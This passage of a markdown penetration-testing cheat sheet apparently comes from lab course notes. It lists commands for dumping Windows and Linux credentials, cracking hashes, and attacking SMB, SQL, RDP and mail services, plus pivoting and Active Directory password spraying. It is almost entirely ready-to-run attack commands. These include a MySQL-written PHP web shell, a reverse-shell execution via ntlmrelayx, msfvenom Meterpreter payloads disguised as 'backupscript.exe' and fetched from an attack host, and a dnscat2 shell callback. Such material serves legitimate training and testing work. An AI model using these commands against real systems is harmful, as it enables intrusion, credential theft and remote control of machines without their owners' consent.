| `crackmapexec smb <ip> --local-auth -u <username> -p <password> --lsa` | Uses CrackMapExec in conjunction with admin credentials to dump lsa secrets, over the network. It is possible to get clear-text credentials this way. |
| `crackmapexec smb <ip> -u <username> -p <password> --ntds` | Uses CrackMapExec in conjunction with admin credentials to dump hashes from the ntds file over a network. |
| `evil-winrm -i <ip>  -u  Administrator -H "<passwordhash>"` | Uses Evil-WinRM to establish a Powershell session with a Windows target using a user and password hash. This is one type of `Pass-The-Hash` attack. |

#### Windows Local Password Attacks

| **Command**| **Description**|
|-|-|
| `tasklist /svc`                                              | A command-line-based utility in Windows used to list running processes. |
| `findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml` | Uses Windows command-line based utility findstr to search for the string "password" in many different file type. |
| `Get-Process lsass`                                          | A Powershell cmdlet is used to display process information. Using this with the LSASS process can be helpful when attempting to dump LSASS process memory from the command line. |
| `rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full` | Uses rundll32 in Windows to create a LSASS memory dump file. This file can then be transferred to an attack box to extract credentials. |
| `pypykatz lsa minidump /path/to/lsassdumpfile`               | Uses Pypykatz to parse and attempt to extract credentials & password hashes from an LSASS process memory dump file. |
| `reg.exe save hklm\sam C:\sam.save`                          | Uses reg.exe in Windows to save a copy of a registry hive at a specified location on the file system. It can be used to make copies of any registry hive (i.e., hklm\sam, hklm\security, hklm\system). |
| `move sam.save \\<ip>\NameofFileShare`                  | Uses move in Windows to transfer a file to a specified file share over the network. |
| `python3 secretsdump.py -sam sam.save -security security.save -system system.save LOCAL` | Uses Secretsdump.py to dump password hashes from the SAM database. |
| `vssadmin CREATE SHADOW /For=C:`                             | Uses Windows command line based tool vssadmin to create a volume shadow copy for `C:`. This can be used to make a copy of NTDS.dit safely. |
| `cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit` | Uses Windows command line based tool copy to create a copy of NTDS.dit for a volume shadow copy of `C:`. |

#### Linux Local Password Attacks

| **Command**| **Description**|
|-|-|
| `for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null \| grep -v "lib\|fonts\|share\|core" ;done` | Script that can be used to find .conf, .config and .cnf files on a Linux system. |
| `for i in $(find / -name *.cnf 2>/dev/null \| grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null \| grep -v "\#";done` | Script that can be used to find credentials in specified file types. |
| `for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null \| grep -v "doc\|lib\|headers\|share\|man";done` | Script that can be used to find common database files.       |
| `find /home/* -type f -name "*.txt" -o ! -name "*.*"`        | Uses Linux-based find command to search for text files.      |
| `for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null \| grep -v "doc\|lib\|headers\|share";done` | Script that can be used to search for common file types used with scripts. |
| `for ext in $(echo ".xls .xls* .xltx .csv .od* .doc .doc* .pdf .pot .pot* .pp*");do echo -e "\nFile extension: " $ext; find / -name *$ext 2>/dev/null \| grep -v "lib\|fonts\|share\|core" ;done` | Script used to look for common types of documents.           |
| `cat /etc/crontab`                                           | Uses Linux-based cat command to view the contents of crontab in search for credentials. |
| `ls -la /etc/cron.*/`                                        | Uses Linux-based  ls -la command to list all files that start with `cron` contained in the etc directory. |
| `grep -rnw "PRIVATE KEY" /* 2>/dev/null \| grep ":1"`        | Uses Linux-based command grep to search the file system for key terms `PRIVATE KEY` to discover SSH keys. |
| `grep -rnw "PRIVATE KEY" /home/* 2>/dev/null \| grep ":1"`    | Uses Linux-based grep command to search for the keywords `PRIVATE KEY` within files contained in a user's home directory. |
| `grep -rnw "ssh-rsa" /home/* 2>/dev/null \| grep ":1"`        | Uses Linux-based grep command to search for keywords `ssh-rsa` within files contained in a user's home directory. |
| `tail -n5 /home/*/.bash*`                                   | Uses Linux-based tail command to search the through bash history files and output the last 5 lines. |
| `python3 mimipenguin.py`                                     | Runs Mimipenguin.py using python3.                           |
| `bash mimipenguin.sh`                                       | Runs Mimipenguin.sh using bash.                              |
| `python2.7 lazagne.py all`                                   | Runs Lazagne.py with all modules using python2.7             |
| `ls -l .mozilla/firefox/ \| grep default `                    | Uses Linux-based command to search for credentials stored by Firefox then searches for the keyword `default` using grep. |
| `cat .mozilla/firefox/1bplpd86.default-release/logins.json \| jq .` | Uses Linux-based command cat to search for credentials stored by Firefox in JSON. |
| `python3.9 firefox_decrypt.py`                               | Runs Firefox_decrypt.py to decrypt any encrypted credentials stored by Firefox. Program will run using python3.9. |
| `python3 lazagne.py browsers`                                | Runs Lazagne.py browsers module using Python 3.               |

#### Cracking Passwords

| **Command**| **Description**|
|-|-|
| `hashcat -m 1000 dumpedhashes.txt /usr/share/wordlists/rockyou.txt` | Uses Hashcat to crack NTLM hashes using a specified wordlist. |
| `hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt --show` | Uses Hashcat to attempt to crack a single NTLM hash and display the results in the terminal output. |
| `unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes` | Uses unshadow to combine data from passwd.bak and shadow.bk into one single file to prepare for cracking. |
| `hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked` | Uses Hashcat in conjunction with a wordlist to crack the unshadowed hashes and outputs the cracked hashes to a file called unshadowed.cracked. |
| ` hashcat -m 500 -a 0 md5-hashes.list rockyou.txt`           | Uses Hashcat in conjunction with a word list to crack the md5 hashes in the md5-hashes.list file. |
| `hashcat -m 22100 backup.hash /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt -o backup.cracked` | Uses Hashcat to crack the extracted BitLocker hashes using a wordlist and outputs the cracked hashes into a file called backup.cracked. |
| `ssh2john.pl SSH.private > ssh.hash`         | Runs Ssh2john.pl script to generate hashes for the SSH keys in the SSH.private file, then redirects the hashes to a file called ssh.hash. |
| `john ssh.hash --show`                                       | Uses John to attempt to crack the hashes in the ssh.hash file, then outputs the results in the terminal. |
| `office2john.py Protected.docx > protected-docx.hash`        | Runs Office2john.py against a protected .docx file and converts it to a hash stored in a file called protected-docx.hash. |
| `john --wordlist=rockyou.txt protected-docx.hash`            | Uses John in conjunction with the wordlist rockyou.txt to crack the hash protected-docx.hash. |
| `pdf2john.pl PDF.pdf > pdf.hash`                       | Runs Pdf2john.pl script to convert a pdf file to a pdf has to be cracked. |
| `john --wordlist=rockyou.txt pdf.hash`                       | Runs John in conjunction with a wordlist to crack a pdf hash. |
| `zip2john ZIP.zip > zip.hash`                                | Runs Zip2john against a zip file to generate a hash, then adds that hash to a file called zip.hash. |
| `john --wordlist=rockyou.txt zip.hash`                       | Uses John in conjunction with a wordlist to crack the hashes contained in zip.hash. |
| `bitlocker2john -i Backup.vhd > backup.hashes`               | Uses Bitlocker2john script to extract hashes from a VHD file and directs the output to a file called backup.hashes. |
| `file GZIP.gzip`                                             | Uses the Linux-based file tool to gather file format information. |
| `for i in $(cat rockyou.txt);do openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2>/dev/null \| tar xz;done` | Script that runs a for-loop to extract files from an archive. |

<a id="11-attacking-common-services"></a>
### 11. Attacking Common Services

#### Attacking FTP

|**Command**|**Description**|
|-|-|
| `ftp 192.168.2.142` | Connecting to the FTP server using the `ftp` client. |
| `nc -v 192.168.2.142 21` | Connecting to the FTP server using `netcat`. |
| `hydra -l user1 -P /usr/share/wordlists/rockyou.txt ftp://192.168.2.142` | Brute-forcing the FTP service. |

#### Attacking SMB

|**Command**|**Description**|
|-|-|
| `smbclient -N -L //10.129.14.128` | Null-session testing against the SMB service. |
| `smbmap -H 10.129.14.128` | Network share enumeration using `smbmap`. |
| `smbmap -H 10.129.14.128 -r notes` | Recursive network share enumeration using `smbmap`. |
| `smbmap -H 10.129.14.128 --download "notes\note.txt"` | Download a specific file from the shared folder. |
| `smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"` | Upload a specific file to the shared folder. |
| `rpcclient -U'%' 10.10.110.17` | Null-session with the `rpcclient`. |
| `./enum4linux-ng.py 10.10.11.45 -A -C` | Automated enumeratition of the SMB service using `enum4linux-ng`. |
| `crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!'` | Password spraying against different users from a list. |
| `impacket-psexec administrator:'Password123!'@10.10.110.17` | Connect to the SMB service using the `impacket-psexec`. |
| `crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec` | Execute a command over the SMB service using `crackmapexec`. |
| `crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users` | Enumerating Logged-on users. |
| `crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam` | Extract hashes from the SAM database. |
| `crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE` | Use the Pass-The-Hash technique to authenticate on the target host. |
| `impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146` | Dump the SAM database using `impacket-ntlmrelayx`. |
| `impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e <base64 reverse shell>` | Execute a PowerShell based reverse shell using `impacket-ntlmrelayx`. |

#### Attacking SQL Databases

|**Command**|**Description**|
|-|-|
| `mysql -u julio -pPassword123 -h 10.129.20.13` | Connecting to the MySQL server. |
| `sqlcmd -S SRVMSSQL\SQLEXPRESS -U julio -P 'MyPassword!' -y 30 -Y 30` | Connecting to the MSSQL server.  |
| `sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h` | Connecting to the MSSQL server from Linux.  |
| `sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h` | Connecting to the MSSQL server from Linux while Windows Authentication mechanism is used by the MSSQL server. |
| `mysql> SHOW DATABASES;` | Show all available databases in MySQL. |
| `mysql> USE htbusers;` | Select a specific database in MySQL. |
| `mysql> SHOW TABLES;` | Show all available tables in the selected database in MySQL. |
| `mysql> SELECT * FROM users;` | Select all available entries from the "users" table in MySQL. |
| `sqlcmd> SELECT name FROM master.dbo.sysdatabases` | Show all available databases in MSSQL. |
| `sqlcmd> USE htbusers` | Select a specific database in MSSQL. |
| `sqlcmd> SELECT * FROM htbusers.INFORMATION_SCHEMA.TABLES` | Show all available tables in the selected database in MSSQL. |
| `sqlcmd> SELECT * FROM users` | Select all available entries from the "users" table in MSSQL. |
| `sqlcmd> EXECUTE sp_configure 'show advanced options', 1` | To allow advanced options to be changed. |
| `sqlcmd> EXECUTE sp_configure 'xp_cmdshell', 1` | To enable the xp_cmdshell. |
| `sqlcmd> RECONFIGURE` | To be used after each sp_configure command to apply the changes. |
| `sqlcmd> xp_cmdshell 'whoami'` | Execute a system command from MSSQL server. |
| `mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php'` | Create a file using MySQL. |
| `mysql> show variables like "secure_file_priv";` | Check if the the secure file privileges are empty to read locally stored files on the system. |
| `sqlcmd> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents` | Read local files in MSSQL. |
| `mysql> select LOAD_FILE("/etc/passwd");` | Read local files in MySQL. |
| `sqlcmd> EXEC master..xp_dirtree '\\10.10.110.17\share\'` | Hash stealing using the `xp_dirtree` command in MSSQL. |
| `sqlcmd> EXEC master..xp_subdirs '\\10.10.110.17\share\'` | Hash stealing using the `xp_subdirs` command in MSSQL. |
| `sqlcmd> SELECT srvname, isremote FROM sysservers` | Identify linked servers in MSSQL.  |
| `sqlcmd> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]` | Identify the user and its privileges used for the remote connection in MSSQL.  |


#### Attacking RDP

|**Command**|**Description**|
|-|-|
| `crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'` | Password spraying against the RDP service. |
| `hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp` | Brute-forcing the RDP service. |
| `rdesktop -u admin -p password123 192.168.2.143` | Connect to the RDP service using `rdesktop` in Linux. |
| `tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}` | Impersonate a user without its password. |
| `net start sessionhijack` | Execute the RDP session hijack. |
| `reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f` | Enable "Restricted Admin Mode" on the target Windows host. |
| `xfreerdp /v:192.168.2.141 /u:admin /pth:A9FDFA038C4B75EBC76DC855DD74F0DA` | Use the Pass-The-Hash technique to login on the target host without a password. |

#### Attacking DNS

|**Command**|**Description**|
|-|-|
| `dig AXFR @ns1.inlanefreight.htb inlanefreight.htb` | Perform an AXFR zone transfer attempt against a specific name server. |
| `subfinder -d inlanefreight.com -v` | Brute-forcing subdomains. |
| `host support.inlanefreight.com` | DNS lookup for the specified subdomain. |

#### Attacking Email Services

|**Command**|**Description**|
|-|-|
| `host -t MX microsoft.com` | DNS lookup for mail servers for the specified domain. |
| `dig mx inlanefreight.com \| grep "MX" \| grep -v ";"` | DNS lookup for mail servers for the specified domain. |
| `host -t A mail1.inlanefreight.htb.` | DNS lookup of the IPv4 address for the specified subdomain. |
| `telnet 10.10.110.20 25` | Connect to the SMTP server. |
| `smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7` | SMTP user enumeration using the RCPT command against the specified host. |
| `python3 o365spray.py --validate --domain msplaintext.xyz` | Verify the usage of Office365 for the specified domain. |
| `python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz` | Enumerate existing users using Office365 on the specified domain. |
| `python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz` | Password spraying against a list of users that use Office365 for the specified domain. |
| `hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3` | Brute-forcing the POP3 service. |
| `swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Notification' --body 'Message' --server 10.10.11.213` | Testing the SMTP service for the open-relay vulnerability. |

<a id="12-pivoting-tunneling-and-port-forwarding"></a>
### 12. Pivoting, Tunneling, and Port Forwarding

| Command                                                      | Description                                                  |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| `ifconfig`                                                     | Linux-based command that displays all current network configurations of a system. |
| `ipconfig`                                                     | Windows-based command that displays all system network configurations. |
| `netstat -r`                                                   | Command used to display the routing table for all IPv4-based protocols. |
| `nmap -sT -p22,3306 <IPaddressofTarget>`                       | Nmap command used to scan a target for open ports allowing SSH or MySQL connections. |
| `ssh -L 1234:localhost:3306 Ubuntu@<IPaddressofTarget>`        | SSH comand used to create an SSH tunnel from a local machine on local port `1234` to a remote target using port 3306. |
| `netstat -antp \| grep 1234`                                   | Netstat option used to display network connections associated with a tunnel created. Using `grep` to filter based on local port `1234` . |
| `nmap -v -sV -p1234 localhost`                                 | Nmap command used to scan a host through a connection that has been made on local port `1234`. |
| `ssh -L 1234:localhost:3306 8080:localhost:80 ubuntu@<IPaddressofTarget>` | SSH command that instructs the ssh client to request the SSH server forward all data via port `1234` to `localhost:3306`. |
| `ssh -D 9050 ubuntu@<IPaddressofTarget>`                       | SSH command used to perform a dynamic port forward on port `9050` and establishes an SSH tunnel with the target. This is part of setting up a SOCKS proxy. |
| `tail -4 /etc/proxychains.conf`                                | Linux-based command used to display the last 4 lines of /etc/proxychains.conf. Can be used to ensure socks configurations are in place. |
| `proxychains nmap -v -sn 172.16.5.1-200`                       | Used to send traffic generated by an Nmap scan through Proxychains and a SOCKS proxy. Scan is performed against the hosts in the specified range `172.16.5.1-200` with increased verbosity (`-v`) disabling ping scan (`-sn`). |
| `proxychains nmap -v -Pn -sT 172.16.5.19`                      | Used to send traffic generated by an Nmap scan through Proxychains and a SOCKS proxy. Scan is performed against 172.16.5.19 with increased verbosity (`-v`), disabling ping discover (`-Pn`), and using TCP connect scan type (`-sT`). |
| `proxychains msfconsole`                                       | Uses Proxychains to open Metasploit and send all generated network traffic through a SOCKS proxy. |
| `msf6 > search rdp_scanner`                                    | Metasploit search that attempts to find a module called `rdp_scanner`. |
| `proxychains xfreerdp /v:<IPaddressofTarget> /u:victor /p:pass@123` | Used to connect to a target using RDP and a set of credentials using proxychains. This will send all traffic through a SOCKS proxy. |
| `msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InteralIPofPivotHost> -f exe -o backupscript.exe LPORT=8080` | Uses msfvenom to generate a Windows-based reverse HTTPS Meterpreter payload that will send a call back to the IP address specified following `lhost=` on local port 8080 (`LPORT=8080`). Payload will take the form of an executable file called `backupscript.exe`. |
| `msf6 > use exploit/multi/handler`                             | Used to select the multi-handler exploit module in Metasploit. |
| `scp backupscript.exe ubuntu@<ipAddressofTarget>:~/`           | Uses secure copy protocol (`scp`) to transfer the file `backupscript.exe` to the specified host and places it in the Ubuntu user's home directory (`:~/`). |
| `python3 -m http.server 8123`                                  | Uses Python3 to start a simple HTTP server listening on port` 8123`. Can be used to retrieve files from a host. |
| `Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"` | PowerShell command used to download a file called backupscript.exe from a webserver (`172.16.5.129:8123`) and then save the file to location specified after `-OutFile`. |
| `ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:80 ubuntu@<ipAddressofTarget> -vN` | SSH command used to create a reverse SSH tunnel from a target to an attack host. Traffic is forwarded on port `8080` on the attack host to port `80` on the target. |
| `msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<IPaddressofAttackHost -f elf -o backupjob LPORT=8080` | Uses msfveom to generate a Linux-based Meterpreter reverse TCP payload that calls back to the IP specified after `LHOST=` on port 8080 (`LPORT=8080`). Payload takes the form of an executable elf file called backupjob. |
| `msf6> run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23`  | Metasploit command that runs a ping sweep module against the specified network segment (`RHOSTS=172.16.5.0/23`). |
|                                                              |                                                              |
| `for i in {1...254} ;do (ping -c 1 172.16.5.$i \| grep "bytes from" &) ;done` | For Loop used on a Linux-based system to discover devices in a specified network segment. |
| `for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 \| find "Reply"` | For Loop used on a Windows-based system to discover devices in a specified network segment. |
| `1..254 \| % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)"}` | PowerShell one-liner used to ping addresses 1 - 254 in the specified network segment. |
| `msf6 > use auxiliary/server/socks_proxy`                      | Metasploit command that selects the `socks_proxy` auxiliary module. |
| `msf6 auxiliary(server/socks_proxy) > jobs`                    | Metasploit command that lists all currently running jobs.    |
| `socks4 	127.0.0.1 9050`                                    | Line of text that should be added to /etc/proxychains.conf to ensure a SOCKS version 4 proxy is used in combination with proxychains on the specified IP address and port. |
| `Socks5 127.0.0.1 1080`                                        | Line of text that should be added to /etc/proxychains.conf to ensure a SOCKS version 5  proxy is used in combination with proxychains on the specified IP address and port. |
| `msf6 > use post/multi/manage/autoroute`                       | Metasploit command used to select the autoroute module.      |
|                                                              |                                                              |
| `meterpreter > help portfwd`                                   | Meterpreter command used to display the features of the portfwd command. |
| `meterpreter > portfwd add -l 3300 -p 3389 -r <IPaddressofTarget>` | Meterpreter-based portfwd command that adds a forwarding rule to the current Meterpreter session. This rule forwards network traffic on port 3300 on the local machine to port 3389 (RDP) on the target. |
| `xfreerdp /v:localhost:3300 /u:victor /p:pass@123`             | Uses xfreerdp to connect to a remote host through localhost:3300 using a set of credentials. Port forwarding rules must be in place for this to work properly. |
| `netstat -antp`                                                | Used to display all (`-a`) active network connections with associated process IDs. `-t` displays only TCP connections.`-n` displays only numerical addresses. `-p` displays process IDs associated with each displayed connection. |
| `meterpreter > portfwd add -R -l 8081 -p 1234 -L <IPaddressofAttackHost>` | Meterpreter-based portfwd command that adds a forwarding rule that directs traffic coming on on port 8081 to the port `1234` listening on the IP address of the Attack Host. |
| `meterpreter > bg`                                             | Meterpreter-based command used to run the selected metepreter session in the background. Similar to background a process in Linux |
| `socat TCP4-LISTEN:8080,fork TCP4:<IPaddressofAttackHost>:80`  | Uses Socat to listen on port 8080 and then to fork when the connection is received. It will then connect to the attack host on port 80. |
| `socat TCP4-LISTEN:8080,fork TCP4:<IPaddressofTarget>:8443`    | Uses Socat to listen on port 8080 and then to fork when the connection is received. Then it will connect to the target host on port 8443. |
| `plink -D 9050 ubuntu@<IPaddressofTarget>`                     | Windows-based command that uses PuTTY's Plink.exe to perform SSH dynamic port forwarding and establishes an SSH tunnel with the specified target. This will allow for proxy chaining on a Windows host, similar to what is done with Proxychains on a Linux-based host. |
| `sudo apt-get install sshuttle`                                | Uses apt-get to install the tool sshuttle.                   |
| `sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0 -v`          | Runs sshuttle, connects to the target host, and creates a route to the 172.16.5.0 network so traffic can pass from the attack host to hosts on the internal network (`172.16.5.0`). |
| `sudo git clone https://github.com/klsecservices/rpivot.git`   | Clones the rpivot project GitHub repository.                 |
| `sudo apt-get install python2.7`                               | Uses apt-get to install python2.7.                           |
| `python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0` | Used to run the rpivot server (`server.py`) on proxy port `9050`, server port `9999` and listening on any IP address (`0.0.0.0`). |
| `scp -r rpivot ubuntu@<IPaddressOfTarget>`                     | Uses secure copy protocol to transfer an entire directory and all of its contents to a specified target. |
| `python2.7 client.py --server-ip 10.10.14.18 --server-port 9999` | Used to run the rpivot client (`client.py`) to connect to the specified rpivot server on the appropriate port. |
| `proxychains firefox-esr <IPaddressofTargetWebServer>:80`      | Opens firefox with Proxychains and sends the web request through a SOCKS proxy server to the specified destination web server. |
| `python client.py --server-ip <IPaddressofTargetWebServer> --server-port 8080 --ntlm-proxy-ip IPaddressofProxy> --ntlm-proxy-port 8081 --domain <nameofWindowsDomain> --username <username> --password <password>` | Use to run the rpivot client to connect to a web server that is using HTTP-Proxy with NTLM authentication. |
| `netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.42.198 connectport=3389 connectaddress=172.16.5.25` | Windows-based command that uses `netsh.exe` to configure a portproxy rule called ` v4tov4`  that listens on port 8080 and forwards connections to the destination 172.16.5.25 on port 3389. |
| `netsh.exe interface portproxy show v4tov4`                    | Windows-based command used to view the configurations of a portproxy rule called v4tov4. |
| `git clone https://github.com/iagox86/dnscat2.git`             | Clones the `dnscat2` project GitHub repository.              |
| `sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache` | Used to start the dnscat2.rb server running on the specified IP address, port (`53`) & using the domain `inlanefreight.local` with the no-cache option enabled. |
| `git clone https://github.com/lukebaggett/dnscat2-powershell.git` | Clones the dnscat2-powershell project Github repository.     |
| `Import-Module dnscat2.ps1`                                    | PowerShell command used to import the dnscat2.ps1 tool.      |
| `Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd` | PowerShell command used to connect to a specified dnscat2 server using a IP address, domain name and preshared secret. The client will send back a shell connection to the server (`-Exec cmd`). |
| `dnscat2> ?`                                                   | Used to list dnscat2 options.                                |
| `dnscat2> window -i 1`                                         | Used to interact with an established dnscat2 session.        |
| `./chisel server -v -p 1234 --socks5`                          | Used to start a chisel server in verbose mode listening on port `1234` using SOCKS version 5. |
| `./chisel client -v 10.129.202.64:1234 socks`                  | Used to connect to a chisel server at the specified IP address & port using socks. |
| `git clone https://github.com/utoni/ptunnel-ng.git`            | Clones the ptunnel-ng project GitHub repository.             |
| `sudo ./autogen.sh`                                            | Used to run the autogen.sh shell script that will build the necessary ptunnel-ng files. |
| `sudo ./ptunnel-ng -r10.129.202.64 -R22`                       | Used to start the ptunnel-ng server on the specified IP address (`-r`) and corresponding port (`-R22`). |
| `sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22` | Used to connect to a specified ptunnel-ng server through local port 2222 (`-l2222`). |
| `ssh -p2222 -lubuntu 127.0.0.1`                                | SSH command used to connect to an SSH server through a local port. This can be used to tunnel SSH traffic through an ICMP tunnel. |
| `regsvr32.exe SocksOverRDP-Plugin.dll`                         | Windows-based command used to register the SocksOverRDP-PLugin.dll. |
| `netstat -antb \|findstr 1080`                                 | Windows-based command used to list TCP network connections listening on port 1080. |

<a id="13-active-directory-enumeration--attacks"></a>
### 13. Active Directory Enumeration & Attacks

#### Initial Enumeration 

| Command                                                      | Description                                                  |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| `nslookup ns1.inlanefreight.com`                             | Used to query the domain name system and discover the IP address to domain name mapping of the target entered from a Linux-based host. |
| `sudo tcpdump -i ens224`                                     | Used to start capturing network packets on the network interface proceeding the `-i` option a Linux-based host. |
| `sudo responder -I ens224 -A`                                | Used to start responding to & analyzing `LLMNR`, `NBT-NS` and `MDNS` queries on the interface specified proceeding the` -I` option and operating in `Passive Analysis` mode which is activated using `-A`. Performed from a Linux-based host |
| `fping -asgq 172.16.5.0/23`                                  | Performs a ping sweep on the specified network segment from a Linux-based host. |
| `sudo nmap -v -A -iL hosts.txt -oN /home/User/Documents/host-enum` | Performs an nmap scan that with OS detection, version detection, script scanning, and traceroute enabled (`-A`) based on a list of hosts (`hosts.txt`) specified in the file proceeding `-iL`. Then outputs the scan results to the file specified after the `-oN`option. Performed from a Linux-based host |
| `sudo git clone https://github.com/ropnop/kerbrute.git`      | Uses `git` to clone the kerbrute tool from a Linux-based host. |
| `make help`                                                  | Used to list compiling options that are possible with `make` from a Linux-based host. |
| `sudo make all`                                              | Used to compile a `Kerbrute` binary for multiple OS platforms and CPU architectures. |
| `./kerbrute_linux_amd64`                                     | Used to test the chosen complied `Kebrute` binary from a Linux-based host. |
| `sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute`       | Used to move the `Kerbrute` binary to a directory can be set to be in a Linux user's path. Making it easier to use the tool. |
| `./kerbrute_linux_amd64 userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o kerb-results` | Runs the Kerbrute tool to discover usernames in the domain (`INLANEFREIGHT.LOCAL`) specified proceeding the `-d` option and the associated domain controller specified proceeding `--dc`using a wordlist and outputs (`-o`) the results to a specified file. Performed from a Linux-based host. |

#### LLMNR/NTB-NS Poisoning 

#### Password Spraying & Password Policies

| Command                                                      | Description                                                  |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| `#!/bin/bash  for x in {{A..Z},{0..9}}{{A..Z},{0..9}}{{A..Z},{0..9}}{{A..Z},{0..9}}     do echo $x; done` | Bash script used to generate `16,079,616` possible username combinations from a Linux-based host. |
| `crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol` | Uses `CrackMapExec`and valid credentials (`avazquez:Password123`) to enumerate the password policy (`--pass-pol`) from a Linux-based host. |
| `rpcclient -U "" -N 172.16.5.5`                              | Uses `rpcclient` to discover information about the domain through `SMB NULL` sessions. Performed from a Linux-based host. |
| `rpcclient $> querydominfo`                                  | Uses `rpcclient` to enumerate the password policy in a target Windows domain from a Linux-based host. |
| `enum4linux  -P 172.16.5.5`                                  | Uses `enum4linux` to enumerate the password policy (`-P`) in a target Windows domain from a Linux-based host. |
| `enum4linux-ng -P 172.16.5.5 -oA ilfreight`                  | Uses `enum4linux-ng` to enumerate the password policy (`-P`) in a target Windows domain from a Linux-based host, then presents the output in YAML & JSON saved in a file proceeding the `-oA` option. |
| `ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" \| grep -m 1 -B 10 pwdHistoryLength` | Uses `ldapsearch` to enumerate the password policy in a  target Windows domain from a Linux-based host. |
| `net accounts`                                               | Used to enumerate the password policy in a Windows domain from a Windows-based host. |
| `Import-Module .\PowerView.ps1`                              | Uses the Import-Module cmd-let to import the `PowerView.ps1` tool from a Windows-based host. |
| `Get-DomainPolicy`                                           | Used to enumerate the password policy in a target Windows domain from a Windows-based host. |
| `enum4linux -U 172.16.5.5  \| grep "user:" \| cut -f2 -d"[" \| cut -f1 -d"]"` | Uses `enum4linux` to discover user accounts in a target Windows domain, then leverages `grep` to filter the output to just display the user from a Linux-based host. |
| `rpcclient -U "" -N 172.16.5.5  rpcclient $> enumdomuser`    | Uses rpcclient to discover user accounts in a target Windows domain from a Linux-based host. |
| `crackmapexec smb 172.16.5.5 --users`                        | Uses `CrackMapExec` to discover users (`--users`) in a target Windows domain from a Linux-based host. |
| `ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  \| grep sAMAccountName: \| cut -f2 -d" "` | Uses `ldapsearch` to discover users in a target Windows doman, then filters the output using `grep` to show only the `sAMAccountName` from a Linux-based host. |
| `./windapsearch.py --dc-ip 172.16.5.5 -u "" -U`              | Uses the python tool `windapsearch.py` to discover users in a target Windows domain from a Linux-based host. |
| `for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 \| grep Authority; done` | Bash one-liner used to perform a password spraying attack using `rpcclient` and a list of users (`valid_users.txt`) from a Linux-based host. It also filters out failed attempts to make the output cleaner. |
| `kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1` | Uses `kerbrute` and a list of users (`valid_users.txt`) to perform a password spraying attack against a target Windows domain from a Linux-based host. |
